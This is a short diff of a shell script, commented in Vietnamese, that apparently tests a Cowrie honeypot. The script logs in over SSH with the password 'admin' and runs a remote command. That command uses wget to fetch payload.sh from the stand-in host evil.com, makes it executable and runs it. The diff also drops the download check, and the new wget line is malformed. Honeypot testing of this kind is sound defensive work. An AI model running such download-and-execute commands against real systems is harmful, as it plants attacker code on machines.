@@ -44,7 +44,7 @@ else
   PASS="admin"
 fi
 
-REMOTE_CMD='cd /tmp; rm -f payload.sh; wget -q -O payload.sh http://evil.com/payload.sh; if [ ! -s payload.sh ]; then echo "[!] payload.sh rỗng/không tải được"; exit 10; fi; chmod +x payload.sh; sh payload.sh'
+REMOTE_CMD='cd /tmp; wget payload.sh http://evil.com/payload.sh; chmod +x payload.sh; sh payload.sh'
 
 say "[*] SSH vào Cowrie & chạy payload (wget) ..."
 set +e
